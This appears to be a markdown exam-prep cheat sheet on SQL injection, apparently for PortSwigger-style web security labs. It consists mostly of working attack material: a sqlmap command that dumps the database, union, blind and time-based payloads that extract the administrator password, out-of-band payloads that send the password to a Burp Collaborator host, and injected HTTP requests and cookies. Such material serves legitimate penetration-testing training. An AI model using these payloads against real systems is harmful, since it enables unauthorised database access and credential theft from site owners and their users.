# SQL Injection - Stage 2

## 🎯 Target Location

**Primary Target:** Advanced Search Page ⭐⭐⭐

If you see an "Advanced Search" page on the exam, you're likely getting an easy privilege escalation via SQL injection.

## 🔥 Quick Win: SQLMap

**RECOMMENDED APPROACH:** Use SQLMap with aggressive settings

```bash
sqlmap -r request.txt --level 5 --risk 3 --batch --dump
```

### SQLMap Workflow

1. **Capture Request** - Save search request to `request.txt`
2. **Run SQLMap** - Use command above
3. **Extract Credentials** - SQLMap will dump admin username/password
4. **Login as Admin** - Use extracted credentials

**Why SQLMap?**
- Saves time (exam is time-limited)
- Handles complex injection scenarios
- Automatically extracts data
- Works while you check other vulnerabilities

## 📋 Manual Injection (If Needed)

### Basic Union-Based Injection
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Determine Column Count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

### Extract Database Info
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Extract User Data
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT username || '~' || password,NULL FROM users--
```

## 🛡️ Special Cases

### XML-Based SQL Injection
**Context:** SQL injection in XML parameter (SQLMap won't work easily)

**Use Hackvertor Extension:**
```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

**Lab Example:**
```xml
<stockCheck>
  <storeId><@hex_entities>1 UNION SELECT NULL<@/hex_entities></storeId>
  <productId>1</productId>
</stockCheck>
```

---

### Blind SQL Injection (Time-Based)
**Detection:**
```sql
' AND SLEEP(5)--
' || pg_sleep(10)--
```

**Data Exfiltration:**
```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a',SLEEP(5),0)--
```

---

### Blind SQL Injection (Boolean-Based)
**Detection:**
```sql
' AND '1'='1
' AND '1'='2
```

**Data Exfiltration:**
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
```

---

### Blind SQL Injection (Out-of-Band)
**Using Burp Collaborator:**
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='administrator'),'.burp.oastify.com\\abc'))--
```

**Oracle:**
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://burp.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

## 🎓 Exam Tips

1. **Use SQLMap first** - `--level 5 --risk 3` for comprehensive testing
2. **Run while multitasking** - SQLMap runs in background, check other app
3. **Check Advanced Search** - Highest probability location
4. **Try TrackingId cookie** - Another common injection point
5. **Use Hackvertor for XML** - Essential for XML-based injection

## 🔍 Common Injection Points

### 1. Advanced Search Parameters
```http
GET /filter?category=Gifts&search=test HTTP/1.1
```

Try:
```http
GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
```

---

### 2. TrackingId Cookie
```http
Cookie: TrackingId=xyz123; session=abc456
```

Try:
```http
Cookie: TrackingId=xyz123' UNION SELECT password FROM users WHERE username='administrator'--; session=abc456
```

---

### 3. Product Stock Check (XML)
```xml
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Try:
```xml
<stockCheck>
  <productId>1</productId>
  <storeId><@hex_entities>1 UNION SELECT NULL<@/hex_entities></storeId>
</stockCheck>
```

## 📚 Database-Specific Payloads

### MySQL
```sql
' UNION SELECT NULL,NULL,NULL#
' UNION SELECT @@version,NULL,NULL#
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables#
```

### PostgreSQL
```sql
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT version(),NULL,NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

### Oracle
```sql
' UNION SELECT NULL,NULL FROM DUAL--
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT table_name,NULL FROM all_tables--
```

### Microsoft SQL Server
```sql
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--
```

## 🔗 Quick Reference

| Task | Payload |
|------|---------|
| Detect injection | `'` or `' OR '1'='1` |
| Comment out rest | `--` or `#` or `/* */` |
| Union injection | `' UNION SELECT NULL--` |
| Extract tables | `' UNION SELECT table_name FROM information_schema.tables--` |
| Extract columns | `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--` |
| Extract data | `' UNION SELECT username,password FROM users--` |

## 📚 References

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [Hackvertor Extension](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)
